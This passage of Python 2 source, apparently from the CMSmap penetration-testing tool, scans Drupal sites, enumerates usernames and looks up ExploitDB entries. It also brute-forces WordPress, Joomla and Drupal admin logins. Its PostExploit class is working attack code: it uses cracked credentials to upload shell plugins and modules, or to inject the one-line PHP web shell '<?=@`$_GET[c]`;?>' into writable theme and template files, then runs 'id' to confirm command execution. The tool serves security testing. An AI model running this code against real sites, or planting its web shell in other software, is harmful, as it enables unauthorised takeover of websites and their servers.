        self.plugins_small = [line.strip() for line in open(os.path.join(dataPath, 'dru_plugins_small.txt'))]
        self.plugins = [line.strip() for line in open(os.path.join(dataPath, 'drupal_plugins.txt'))]
        self.versions = [line.strip() for line in open(os.path.join(dataPath, 'drupal_versions.txt'))]

    def Drurun(self):
        msg = "CMS Detection: Drupal"; report.info(msg)
        self.DruVersion()
        self.DruCurrentTheme()
        self.DruConfigFiles()
        self.DruViews()
        self.DruBlog()
        BruteForcer(self.url,self.usernames,self.weakpsw).Drurun()
        self.DruNotExisitingCode()
        self.DruDefaultFiles()
        # === Takes Long ===
        self.genChecker.CommonFiles()
        self.DruForgottenPassword()
        self.DruModules()
        ExploitDBSearch(self.url, "Drupal", self.pluginsFound).Plugins()
        self.DruDirsListing()
        
    def DruVersion(self):
        try:
            htmltext = urllib2.urlopen(self.url+'/CHANGELOG.txt').read()
            regex = 'Drupal (\d+\.\d+),'
            pattern =  re.compile(regex)
            version = re.findall(pattern,htmltext)[0]
            if version:
                msg = "Drupal Version: "+version; report.info(msg)
                for ver in self.versions:
                    ExploitDBSearch(self.url, 'Drupal', ver).Core()
                    if ver == version:
                        break 
        except urllib2.HTTPError, e:
            #print e.code
            pass

    def DruCurrentTheme(self):
        try:
            htmltext = urllib2.urlopen(self.url+'/index.php').read()
            DruTheme = re.findall("/themes/(.+?)/", htmltext,re.IGNORECASE)
            if DruTheme :
                self.Drutheme = DruTheme[0]
                msg = "Drupal Theme: "+ self.Drutheme ; report.info(msg)
                ExploitDBSearch(self.url, "Drupal", [self.Drutheme]).Themes()
            return DruTheme[0]
        except urllib2.HTTPError, e:
            #print e.code
            pass

    def DruConfigFiles(self):
        for file in self.confFiles:
            req = urllib2.Request(self.url+"/sites/"+self.netloc+"/settings"+file)
            try:
                urllib2.urlopen(req)
                msg = "Configuration File Found: " +self.url+"/sites/"+self.netloc+"/settings"+file; report.high(msg)
            except urllib2.HTTPError, e:
                #print e.code
                pass   
           
    def DruDefaultFiles(self):
        self.defFilesFound = []
        msg = "Drupal Default Files: "; report.message(msg)
        report.WriteTextFile(msg)
        self.defFiles=['/README.txt',
                  '/INSTALL.mysql.txt',
                  '/MAINTAINERS.txt',
                  '/profiles/standard/translations/README.txt',
                  '/profiles/minimal/translations/README.txt',
                  '/INSTALL.pgsql.txt',
                  '/UPGRADE.txt',
                  '/CHANGELOG.txt',
                  '/INSTALL.sqlite.txt',
                  '/LICENSE.txt',
                  '/INSTALL.txt',
                  '/COPYRIGHT.txt',
                  '/web.config',
                  '/modules/README.txt',
                  '/modules/simpletest/files/README.txt',
                  '/modules/simpletest/files/javascript-1.txt',
                  '/modules/simpletest/files/php-1.txt',
                  '/modules/simpletest/files/sql-1.txt',
                  '/modules/simpletest/files/html-1.txt',
                  '/modules/simpletest/tests/common_test_info.txt',
                  '/modules/filter/tests/filter.url-output.txt',
                  '/modules/filter/tests/filter.url-input.txt',
                  '/modules/search/tests/UnicodeTest.txt',
                  '/themes/README.txt',
                  '/themes/stark/README.txt',
                  '/sites/README.txt',
                  '/sites/all/modules/README.txt',
                  '/sites/all/themes/README.txt',
                  '/modules/simpletest/files/html-2.html',
                  '/modules/color/preview.html',
                  '/themes/bartik/color/preview.html'
                  ]
        for file in self.defFiles:
            req = urllib2.Request(self.url+file,None,self.headers)
            try:
                urllib2.urlopen(req)
                self.defFilesFound.append(self.url+file)
            except urllib2.HTTPError, e:
                #print e.code
                pass
        for file in self.defFilesFound:
            msg = file; report.info(msg)

    def DruViews(self):
        self.views = "/?q=admin/views/ajax/autocomplete/user/"
        self.alphanum = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
        usernames = []
        msg =  "Enumerating Drupal Usernames via \"Views\" Module..."; report.message(msg)
        req = urllib2.Request(self.url+"/?q=admin/views/ajax/autocomplete/user/NotExisingUser1234!",None, self.headers)
        noRedirOpener = urllib2.build_opener(NoRedirects())        
        try:
            htmltext = noRedirOpener.open(req).read()
            #If NotExisingUser1234 returns [  ], then enumerate users
            if htmltext == '[  ]':
                for letter in self.alphanum:
                    htmltext = urllib2.urlopen(self.url+self.views+letter).read()
                    regex = '"(.+?)"'
                    pattern =  re.compile(regex)
                    usernames = usernames + re.findall(pattern,htmltext)
                usernames = sorted(set(usernames))
                for user in usernames:
                    msg = user; report.info(msg)
        except urllib2.HTTPError, e:
            pass
        
    def DruBlog(self):
        self.blog = "/?q=blog/"
        usernames = []
        try:
            urllib2.urlopen(self.url+self.blog)
            msg =  "Enumerating Drupal Usernames via \"Blog\" Module..."; report.message(msg)
            report.WriteTextFile(msg)
            for blognum in range (1,50):
                try:
                    htmltext = urllib2.urlopen(self.url+self.blog+str(blognum)).read()
                    regex = "<title>(.+?)\'s"
                    pattern =  re.compile(regex)
                    user = re.findall(pattern,htmltext)
                    usernames = usernames + user
                    if user : msg = user[0] ; report.info(msg)
                except urllib2.HTTPError, e:
                    pass
            self.usernames = usernames
        except urllib2.HTTPError, e:
            #print e.code
            pass
        
    def DruForgottenPassword(self):
        # Username Enumeration via Forgotten Password
        query_args = {"name": "N0t3xist!1234" ,"form_id":"user_pass"}
        data = urllib.urlencode(query_args)
        # HTTP POST Request
        req = urllib2.Request(self.url+self.forgottenPsw, data)
        #print "[*] Trying Credentials: "+user+" "+pwd
        try:
            htmltext = urllib2.urlopen(req).read()
            if re.findall(re.compile('Sorry,.*N0t3xist!1234.*is not recognized'),htmltext):
                msg = "Forgotten Password Allows Username Enumeration: "+self.url+self.forgottenPsw; report.info(msg)
                report.WriteTextFile(msg)        
        except urllib2.HTTPError, e:
            #print e.code
            pass

    def DruDirsListing(self):
        msg = "Checking for Directory Listing Enabled ..."; print msg
        report.WriteTextFile(msg)
        GenericChecks(self.url).DirectoryListing('/includes/')
        GenericChecks(self.url).DirectoryListing('/misc/')
        GenericChecks(self.url).DirectoryListing('/modules/')
        GenericChecks(self.url).DirectoryListing('/profiles/')
        GenericChecks(self.url).DirectoryListing('/scripts/')
        GenericChecks(self.url).DirectoryListing('/sites/')
        GenericChecks(self.url).DirectoryListing('/includes/')
        GenericChecks(self.url).DirectoryListing('/themes/')
        for plugin in self.pluginsFound:
            GenericChecks(self.url).DirectoryListing('/modules/'+plugin)
            
    def DruNotExisitingCode(self):
        req = urllib2.Request(self.url+self.pluginPath+"N0WayThatYouAreHere123"+"/",None, self.headers)
        noRedirOpener = urllib2.build_opener(NoRedirects())        
        try:
            htmltext = noRedirOpener.open(req).read()
            self.notValidLen.append(len(htmltext))
        except urllib2.HTTPError, e:
            #print e.code
            self.notValidLen.append(len(e.read()))
            self.notExistingCode = e.code
                       
    def DruModules(self):
        msg = "Search Drupal Module ..."; report.message(msg)
        if  not FullScan : self.plugins = self.plugins_small
        self.pbar = progressbar.ProgressBar(widgets=self.widgets, maxval=len(self.plugins)).start()
        # Create Code
        q = Queue.Queue(self.queue_num)
        # Spawn all threads into code
        for u in range(self.thread_num):
            t = ThreadScanner(self.url,self.pluginPath,"/",self.pluginsFound,self.notExistingCode,self.notValidLen,q)
            t.daemon = True
            t.start()
        # Add all plugins to the queue
        for r,i in enumerate(self.plugins):
            q.put(i)  
            self.pbar.update(r+1)
        q.join()
        self.pbar.finish()
    
class ExploitDBSearch:
    def __init__(self,url,cmstype,query):
        self.url = url
        self.query = query
        self.cmstype = cmstype
        self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
        self.headers={'User-Agent':self.agent,}
        
    def Core(self):
        if self.query is not None:
            # Get this value from their classes      
            msg = "Searching Core Vulnerabilities for version "+self.query ; report.verbose(msg)
            self.EDB = []
            htmltext = urllib2.urlopen("http://www.exploit-db.com/search/?action=search&filter_description="+self.cmstype+"+"+self.query).read()
            regex = '/download/(.+?)">'
            pattern =  re.compile(regex)
            ExploitID = re.findall(pattern,htmltext)
            for Eid in ExploitID:
                # If Eid hasn't been already found, then go on
                if Eid not in self.EDB:
                    req = urllib2.Request("http://www.exploit-db.com/exploits/"+str(Eid)+"/",None,self.headers)
                    htmltext = urllib2.urlopen(req).read()
                    self.title = re.findall(re.compile('<title>(.+?)</title>'),htmltext)
                    self.date = re.findall(re.compile('>Published: (.+?)</td>'),htmltext)
                    self.verified = 'Yes'
                    if re.search(re.compile('Not Verified'),htmltext): self.verified = 'No '
                    if self.title and self.date:
                        msg = " EDB-ID: "+Eid+" Date: "+self.date[0] +" Verified: "+self.verified+" Title: "+ self.title[0].replace('&gt;', '>').replace('&lt;','<').replace('&amp;','&')
                        report.medium(msg)
                    else:
                        msg = " EDB-ID: "+Eid; report.medium(msg)
            self.EDB = self.EDB + ExploitID
            self.EDB = sorted(set(self.EDB))
        else:
            pass
        
    def Plugins(self):
        if self.query is not None:
            msg = "Searching Vulnerable Plugins from ExploitDB website ..." ; report.message(msg)
            self.EDB = []
            for plugin in self.query:
                htmltext = urllib2.urlopen("http://www.exploit-db.com/search/?action=search&filter_description="+self.cmstype+"&filter_exploit_text="+plugin).read()
                regex = '/download/(.+?)">'
                pattern =  re.compile(regex)
                ExploitID = re.findall(pattern,htmltext)
                msg =  plugin; report.info(msg)
                for Eid in ExploitID:
                    # If Eid hasn't been already found, then go on
                    if Eid not in self.EDB:
                        req = urllib2.Request("http://www.exploit-db.com/exploits/"+str(Eid)+"/",None,self.headers)
                        htmltext = urllib2.urlopen(req).read()
                        self.title = re.findall(re.compile('<title>(.+?)</title>'),htmltext)
                        self.date = re.findall(re.compile('>Published: (.+?)</td>'),htmltext)
                        self.verified = 'Yes'
                        if re.search(re.compile('Not Verified'),htmltext): self.verified = 'No '
                        if self.title and self.date:
                            msg = " EDB-ID: "+Eid+" Date: "+self.date[0] +" Verified: "+self.verified+" Title: "+ self.title[0].replace('&gt;', '>').replace('&lt;','<').replace('&amp;','&')
                            report.medium(msg)
                        else:
                            msg = " EDB-ID: "+Eid; report.medium(msg)
                self.EDB = self.EDB + ExploitID
                self.EDB = sorted(set(self.EDB))
        else:
            pass
        
    def Themes(self):
        if self.query is not None:
            msg = "Searching Vulnerable Theme from ExploitDB website ..."; report.message(msg)
            self.EDB = []
            for theme in self.query :
                htmltext = urllib2.urlopen("http://www.exploit-db.com/search/?action=search&filter_description="+self.cmstype+"&filter_exploit_text="+theme).read()
                regex = '/download/(.+?)">'
                pattern =  re.compile(regex)
                ExploitID = re.findall(pattern,htmltext)
                for Eid in ExploitID:
                    # If Eid hasn't been already found, then go on
                    if Eid not in self.EDB:
                        req = urllib2.Request("http://www.exploit-db.com/exploits/"+str(Eid)+"/",None,self.headers)
                        htmltext = urllib2.urlopen(req).read()
                        self.title = re.findall(re.compile('<title>(.+?)</title>'),htmltext)
                        self.date = re.findall(re.compile('>Published: (.+?)</td>'),htmltext)
                        self.verified = 'Yes'
                        if re.search(re.compile('Not Verified'),htmltext): self.verified = 'No '
                        if self.title and self.date:
                            msg = " EDB-ID: "+Eid+" Date: "+self.date[0] +" Verified: "+self.verified+" Title: "+ self.title[0].replace('&gt;', '>').replace('&lt;','<').replace('&amp;','&')
                            report.medium(msg)
                        else:
                            msg = " EDB-ID: "+Eid; report.medium(msg)
                self.EDB = self.EDB + ExploitID
                self.EDB = sorted(set(self.EDB))                
        else:
            pass

class NoRedirects(urllib2.HTTPRedirectHandler):
    """Redirect handler that simply raises a Redirect()."""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        RedirError = urllib2.HTTPError(req.get_full_url(), code, msg, headers, fp)
        RedirError.status = code
        raise RedirError
        
class ThreadScanner(threading.Thread):
    # self.url = http://mysite.com
    # pluginPath = /wp-content
    # pluginPathEnd = /
    # pluginFound = wptest 
    def __init__(self,url,pluginPath,pluginPathEnd,pluginsFound,notExistingCode,notValidLen,q):
        threading.Thread.__init__ (self)
        self.url = url
        self.q = q
        self.pluginPath = pluginPath
        self.pluginsFound = pluginsFound
        self.pluginPathEnd = pluginPathEnd
        self.notExistingCode = notExistingCode
        self.notValidLen = notValidLen
        self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
        self.headers={'User-Agent':self.agent,'Accept-Encoding': None,}

    def run(self):
        while True:
            # Get plugin from plugin queue
            plugin = self.q.get()
            req = urllib2.Request(self.url+self.pluginPath+plugin+self.pluginPathEnd,None,self.headers)
            noRedirOpener = urllib2.build_opener(NoRedirects())        
            try:
                noRedirOpener.open(req); self.pluginsFound.append(plugin)
            except urllib2.HTTPError, e:
                if e.code != self.notExistingCode and len(e.read()) not in self.notValidLen : self.pluginsFound.append(plugin)
            except urllib2.URLError, e:
                msg = "[!] Thread Error: If this error persists, reduce number of threads"; print msg
            self.q.task_done()
            

class BruteForcer:
        def __init__(self,url,usrlist,pswlist):
            self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
            self.headers={'User-Agent':self.agent,}
            if type(usrlist) is str :
                try:
                    self.usrlist = [line.strip() for line in open(usrlist)]
                except IOError:
                    self.usrlist = [usrlist]
            else:
                self.usrlist = usrlist
            if type(pswlist) is str :
                try:
                    self.pswlist = [line.strip() for line in open(pswlist)]
                except IOError:
                    self.pswlist = [pswlist]
            else:
                self.pswlist = pswlist            
            self.url = url
            
        def FindCMSType(self):
            req = urllib2.Request(self.url,None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            m = re.search("Wordpress", htmltext)
            if m: 
                msg = "CMS Detection: Wordpress "; report.info(msg)
                msg =  "Wordpress Brute Forcing Attack Started"; report.message(msg)
                self.WPrun();
                
            m = re.search("Joomla", htmltext)
            if m: 
                msg = "CMS Detection: Joomla"; report.message(msg)
                msg = "Joomla Brute Forcing Attack Started"; report.message(msg)
                self.Joorun()
            m = re.search("Drupal", htmltext);
            if m:
                msg = "CMS Detection: Drupal"; report.message(msg)
                msg = "Drupal Brute Forcing Attack Started"; report.message(msg)
                self.Drurun()
            
        def WPrun(self):
            self.wplogin = "/wp-login.php"
            self.WPValidCredentials = []
            usersFound = []
            for user in self.usrlist:
                cookieJar = cookielib.CookieJar()
                cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
                opener = urllib2.build_opener(cookieHandler)
                opener.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20110201 Firefox/2.0.0.14')]
                cookieJar.clear()
                self.pswlist.append(user) # try username as password
                for pwd in self.pswlist:
                    query_args = {"log": user ,"pwd": pwd, "wp-submit":"Log+In"}
                    data = urllib.urlencode(query_args)
                    msg = "Trying Credentials: "+user+" "+pwd; report.verbose(msg)
                    try:
                        # HTTP POST Request
                        htmltext = opener.open(self.url+self.wplogin, data).read()
                        if re.search('<strong>ERROR</strong>: Invalid username',htmltext):
                            msg = "Invalid Username: "+user; report.verbose(msg)
                            break
                        elif re.search('username <strong>(.+?)</strong> is incorrect.',htmltext):
                            usersFound.append(user)
                        elif re.search('ERROR.*block.*',htmltext,re.IGNORECASE):
                            msg = "Account Lockout Enabled: Your IP address has been temporary blocked. Try it later or from a different IP address"; report.error(msg)
                            return
                        elif re.search('dashboard',htmltext,re.IGNORECASE):
                            msg = "Valid Credentials: "+user+" "+pwd; report.high(msg)
                            self.WPValidCredentials.append([user,pwd])                       
                    except urllib2.HTTPError, e:
                        #print e.code
                        pass
                self.pswlist.pop() # remove user
            msg = "[-] Valid Usernames found: "; print msg
            report.WriteTextFile(msg)
            for userf in (sorted(set(usersFound))):
                msg = userf; report.medium(msg)
            for WPCredential in self.WPValidCredentials :
                PostExploit(self.url).WPShell(WPCredential[0], WPCredential[1])
           
        def Joorun(self):
            # It manages token and Cookies
            self.joologin = "/administrator/index.php"
            self.JooValidCredentials = []
            for user in self.usrlist:
                cookieJar = cookielib.CookieJar()
                cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
                opener = urllib2.build_opener(cookieHandler)
                opener.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20110201 Firefox/2.0.0.14')]
                cookieJar.clear()
                # Get Token and Session Cookie
                htmltext = opener.open(self.url+self.joologin).read()
                reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
                token = reg.search(htmltext).group(1)
                self.pswlist.append(user) # try username as password
                for pwd in self.pswlist:
                    # Send Post With Token and Session Cookie
                    query_args = {"username": user ,"passwd": pwd, "option":"com_login","task":"login",token:"1"}
                    data = urllib.urlencode(query_args)
                    #print "[*] Trying Credentials: "+user+" "+pwd
                    try:
                        htmltext = opener.open(self.url+self.joologin, data).read()
                        if re.findall(re.compile('Joomla - Administration - Control Panel'),htmltext):
                            msg = "Valid Credentials: "+user+" "+pwd; report.high(msg)
                            self.JooValidCredentials.append([user,pwd])
                    except urllib2.HTTPError, e:
                        #print e.code
                        pass
                self.pswlist.pop() # remove user
            for JooCredential in self.JooValidCredentials :
                PostExploit(self.url).JooShell(JooCredential[0], JooCredential[1])

        def Drurun(self):
            self.drulogin = "/?q=user/login"
            self.DruValidCredentials = []
            for user in self.usrlist:
                self.pswlist.append(user) # try username as password
                for pwd in self.pswlist:
                    query_args = {"name": user ,"pass": pwd, "form_id":"user_login"}
                    data = urllib.urlencode(query_args)
                    # HTTP POST Request
                    req = urllib2.Request(self.url+self.drulogin, data,self.headers)
                    #print "[*] Trying Credentials: "+user+" "+pwd
                    try:
                        htmltext = urllib2.urlopen(req).read()
                        if re.findall(re.compile('Sorry, too many failed login attempts from your IP address.'),htmltext):
                            msg = "Account Lockout Enabled: Your IP address has been temporary blocked. Try it later or from a different IP address"
                            report.error(msg)
                            return
                    except urllib2.HTTPError, e:
                        #print e.code
                        if e.code == 403:
                            msg = "Valid Credentials: "+user+" "+pwd; report.high(msg)
                            self.DruValidCredentials.append([user,pwd])
                self.pswlist.pop() # remove user
            for DruCredential in self.DruValidCredentials :
                PostExploit(self.url).DruShell(DruCredential[0], DruCredential[1])
              
class PostExploit:
    def __init__(self,url):
        self.url = url
        
    def WPShell(self,user,password):
        self.wplogin = "/wp-login.php"
        self.wpupload = "/wp-admin/update.php?action=upload-plugin"
        self.wppluginpage = "/wp-admin/plugin-install.php?tab=upload"
        self.query_args_login = {"log": user ,"pwd": password, "wp-submit":"Log+In"}
        # Set cookies
        cookieJar = cookielib.CookieJar()
        cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
        opener = urllib2.build_opener(cookieHandler,multipartpost.MultipartPostHandler)
        opener.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20110201 Firefox/2.0.0.14')]
        cookieJar.clear()
        try: 
            # Login in WordPress - HTTP Post
            msg ="[-] Logging in to on the target website ..."
            report.verbose(msg)
            opener.open(self.url+self.wplogin, urllib.urlencode(self.query_args_login))
            # Request WordPress Plugin Upload page
            htmltext = opener.open(self.url+self.wppluginpage).read()
            self.wpnonce = re.findall(re.compile('name="_wpnonce" value="(.+?)"'),htmltext) 
            # Upload Plugin
            self.params = { "_wpnonce" : self.wpnonce[0],"pluginzip" : open("shell/wp-shell.zip", "rb") , "install-plugin-submit":"Install Now"}
            htmltext = opener.open(self.url+self.wpupload, self.params).read()
            if re.search("Plugin installed successfully",htmltext):
                msg = "CMSmap WordPress Shell Plugin Installed"; report.high(msg)
                msg = "Web Shell: "+self.url+"/wp-content/plugins/wp-shell/shell.php"; report.high(msg)
                msg = "Remember to delete CMSmap WordPress Shell Plugin"; report.message(msg)
        
        except urllib2.HTTPError, e:
            #print e.code
            pass           
            
    def WPwritableThemes(self,user,password):
        self.theme = WPScan(self.url,threads).WPCurrentTheme()
        self.wplogin = "/wp-login.php"
        self.wpThemePage = "/wp-admin/theme-editor.php"
        self.query_args_login = {"log": user ,"pwd": password, "wp-submit":"Log+In"}
        self.shell = "<?=@`$_GET[c]`;?>"
        # Set cookies
        cookieJar = cookielib.CookieJar()
        cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
        opener = urllib2.build_opener(cookieHandler)
        opener.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20110201 Firefox/2.0.0.14')]
        cookieJar.clear()
        
        try:
            # HTTP POST Request
            msg = "Logging in to the target website ..."; report.verbose(msg)
            opener.open(self.url+self.wplogin, urllib.urlencode(self.query_args_login))
            
            msg = "[-] Looking for Theme Editor Page on the target website ..."; report.verbose(msg)
            htmltext = opener.open(self.url+self.wpThemePage).read()
            tempPages = re.findall(re.compile('href=\"theme-editor\.php\?file=(.+?)\.php'),htmltext)
            
            msg = "[-] Looking for a writable theme page on the target website ..."; report.verbose(msg)
            for tempPage in tempPages:      
                htmltext = opener.open(self.url+"/wp-admin/theme-editor.php"+"?file="+tempPage+".php&theme="+self.theme).read()
                if re.search('value="Update File"', htmltext) :
                    msg =  "Writable theme page found : "+ tempPage+".php"; report.medium(msg)
                    self.wpnonce = re.findall(re.compile('name="_wpnonce" value="(.+?)"'),htmltext)              
                    self.phpCode = re.findall('<textarea.*>(.+?)</textarea>',htmltext,re.S)
                    
                    msg =  "Creating a theme page with a PHP shell on the target website ..."; report.verbose(msg)
                    self.newcontent = self.shell+self.phpCode[0].decode('utf8').replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"').replace("&#039;", "'")
        
                    query_args = {"_wpnonce": self.wpnonce[0],"newcontent": self.newcontent,"action":"update","file":tempPage+".php","theme":self.theme,"submit":"Update+File"}
                    data = urllib.urlencode(query_args)
                    
                    msg = "Updating a new theme page with a PHP shell on the target website ..."; report.message(msg)
                    opener.open(self.url+"/wp-admin/theme-editor.php",data).read()
                    
                    htmltext = urllib.urlopen(self.url+"/wp-content/themes/"+self.theme+"/"+tempPage+".php?c=id").read()
                    if re.search('uid=\d+\(.+?\) gid=\d+\(.+?\) groups=\d+\(.+?\)', htmltext) :
                        msg = "Web shell Found: " + self.url+"/wp-content/themes/"+self.theme+"/"+tempPage+".php?c=id"; report.high(msg)
                        msg = "$ id"; report.high(msg)
                        msg = htmltext; report.high(msg)
                        # shell found then exit
                        sys.exit()
        except urllib2.HTTPError, e:
            #print e.code
            pass
        
    def JooShell(self,user,password):
        self.joologin = "/administrator/index.php"
        self.jooupload = "/administrator/index.php?option=com_installer&view=install"
        self.jooThemePage = "/administrator/index.php?option=com_templates"
        # Set cookies
        cookieJar = cookielib.CookieJar()
        cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
        opener = urllib2.build_opener(cookieHandler,multipartpost.MultipartPostHandler)
        opener.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20110201 Firefox/2.0.0.14')]
        cookieJar.clear()
        try:
            # HTTP POST Request 
            msg = "[-] Logging into the target website ..."; report.verbose(msg)

            # Get Token and Session Cookie
            htmltext = opener.open(self.url+self.joologin).read()
            reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
            self.token = reg.search(htmltext).group(1)     
            # Logining on the website with username and password
            self.query_args_login = {"username": user ,"passwd": password, "option":"com_login","task":"login",self.token:"1"}
            data = urllib.urlencode(self.query_args_login)
            htmltext = opener.open(self.url+self.joologin, data).read()
            # Get Token in Upload Page
            htmltext = opener.open(self.url+self.jooupload).read()
            reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
            try:
                self.token = reg.search(htmltext).group(1)
                # Upload Component
                self.params = { "install_package" : open("shell/joo-shell.zip", "rb") , "installtype":"upload","task":"install.install",self.token:"1"}
                htmltext = opener.open(self.url+self.jooupload, self.params).read()
                if re.search("Installing component was successful.",htmltext):
                    msg ="CMSmap Joomla Shell Plugin Installed"; report.high(msg)
                    msg = "Web Shell: "+self.url+"/components/com_joo-shell/joo-shell.php"; report.high(msg)
                    msg = "Remember to unistall CMSmap Joomla Shell Component"; report.message(msg)
                    report.WriteTextFile(msg)
            except AttributeError:
                msg = user+" in Not admin"; report.message(msg)
        except urllib2.HTTPError, e:
            # print e.code
            pass

    def JooWritableTemplate(self,user,password):
        self.joologin = "/administrator/index.php"
        self.jooThemePage = "/administrator/index.php?option=com_templates"
        self.shell = "<?=@`$_GET[c]`;?>"
        
        # Set cookies
        cookieJar = cookielib.CookieJar()
        cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
        opener = urllib2.build_opener(cookieHandler)
        opener.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20110201 Firefox/2.0.0.14')]
        cookieJar.clear()
        
        try:
            # HTTP POST Request
            msg = "Logging in to the target website ..."; report.verbose(msg)
            # Get Token and Session Cookie
            htmltext = opener.open(self.url+self.joologin).read()
            reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
            token = reg.search(htmltext).group(1)            
            # Logging in to the website with username and password
            query_args = {"username": user ,"passwd": password, "option":"com_login","task":"login",token:"1"}
            data = urllib.urlencode(query_args)
            htmltext = opener.open(self.url+self.joologin, data).read()
            
            msg = "Looking for Administrator Template on the target website ..."; report.verbose(msg)
            htmltext = opener.open(self.url+self.jooThemePage).read()
            # Gets template IDs
            tempPages = re.findall(re.compile('view=template&amp;id=(.+?) ">'),htmltext)
            
            msg = "Looking for a writable themplate on the target website ..."; report.verbose(msg)
            for tempPage in tempPages:
                # For each template ID   
                htmltext = opener.open(self.url+"/administrator/index.php?option=com_templates&task=source.edit&id="+base64.b64encode(tempPage+":index.php")).read()
                template = re.findall(re.compile('template "(.+?)"\.</legend>'),htmltext)
                if verbose : print "[-] Joomla template Found: "+ template[0]
                # Gets phpCode and Token
                self.phpCode = re.findall('<textarea.*>(.+?)</textarea>',htmltext,re.S)
                self.token = re.findall(re.compile("logout&amp;(.+?)=1\">Logout"),htmltext)
                # Decode phpCode and add a shell
                self.newcontent = self.shell+self.phpCode[0].decode('utf8').replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"').replace("&#039;", "'")
                query_args = {"jform[source]": self.newcontent,"task": "source.apply",self.token[0]:"1","jform[extension_id]":tempPage,"jform[filename]":"index.php"}
                data = urllib.urlencode(query_args)
                # Send request
                msg = "Updating a new template with a PHP shell on the target website ..."; report.verbose(msg)
                htmltext = opener.open(self.url+"/administrator/index.php?option=com_templates&layout=edit",data).read()
                
                if not re.search('Error',htmltext,re.IGNORECASE):
                # If not error, then find shell
                    htmltext = urllib.urlopen(self.url+"/templates/"+template[0]+"/"+"index.php?c=id").read()
                    if re.search('uid=\d+\(.+?\) gid=\d+\(.+?\) groups=\d+\(.+?\)', htmltext) :
                        # Front end template
                        msg = "Web shell Found: " + self.url+"/templates/"+template[0]+"/"+"index.php?c=id"; report.high(msg)
                        msg = "$ id"; report.high(msg)
                        msg = htmltext; report.high(msg)
                        # shell found then exit
                        sys.exit()
                    else:
                        htmltext = urllib.urlopen(self.url+"/administrator/templates/"+template[0]+"/"+"index.php?c=id").read()
                        # Back end template
                        if re.search('uid=\d+\(.+?\) gid=\d+\(.+?\) groups=\d+\(.+?\)', htmltext) :
                            msg = "Web shell Found: " + self.url+"/administrator/templates/"+template[0]+"/"+"index.php?c=id"; report.high(msg)
                            msg = "$ id"; report.high(msg)
                            msg = htmltext; report.high(msg)
                            # shell found then exit
                            sys.exit()
                else:
                    msg = "Not Writable Joomla template: "+ template[0]; report.verbose()
                
        except urllib2.HTTPError, e:
            # print e.code
            pass

    def DruShell(self,user,password):
        self.drulogin = "/?q=user/login"
        self.drupModules = "/?q=admin/modules"
        self.druAuthorize = "/authorize.php?batch=1&op=do"
        self.druInstall = "/?q=admin/modules/install"
        # Set cookies
        cookieJar = cookielib.CookieJar()
        cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
        opener = urllib2.build_opener(cookieHandler,multipartpost.MultipartPostHandler)
        opener.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20110201 Firefox/2.0.0.14')]
        cookieJar.clear()        
        try:
            # HTTP POST Request
            msg = "Logging into the target website..."; report.verbose(msg)

            # Logging into the website with username and password
            self.query_args_login = {"name": user ,"pass": password, "form_id":"user_login"}
            data = urllib.urlencode(self.query_args_login)
            htmltext = opener.open(self.url+self.drulogin, data).read()
            # Get Token and Build id in Upload Page
            htmltext = opener.open(self.url+self.druInstall).read()
            self.token = re.findall(re.compile('<input type="hidden" name="form_token" value="(.+?)"'),htmltext)
            self.form_buildid = re.findall(re.compile('<input type="hidden" name="form_build_id" value="(.+?)"'),htmltext)
            # Upload Module
            self.params = { "files[project_upload]" : open("shell/dru-shell.zip", "rb") , "form_build_id":self.form_buildid[0],"form_token":self.token[0],"form_id":"update_manager_install_form","op":"Install"}
            htmltext = opener.open(self.url+self.druInstall, self.params).read()
            self.dru_id = re.findall(re.compile('id=(.+?)&'),htmltext)
            try:
                htmltext = opener.open(self.url+"/authorize.php?batch=1&op=start&id="+self.dru_id[0]).read()
                if re.search("Installing drushell",htmltext):
                    msg = "CMSmap Drupal Shell Module Installed"; report.high(msg)
                    msg = "Web Shell: "+self.url+"/sites/all/modules/drushell/shell.php"; report.high(msg)
                    msg = "Remember to delete CMSmap Drupal Shell Module"; report.message(msg)
            except IndexError :
                msg = "Unable to install CMSmap Drupal Shell Module. Check if it is already installed"
                report.verbose(msg)
        except urllib2.HTTPError, e:
            # print e.code
            pass
    
    def CrackingHashesType(self,hashfile,wordlist):
        self.hashfile = hashfile
        self.wordlist = wordlist
        if not os.path.isfile('wordlist/rockyou.txt'): 
            print "[-] Decompressing rockyou.zip"
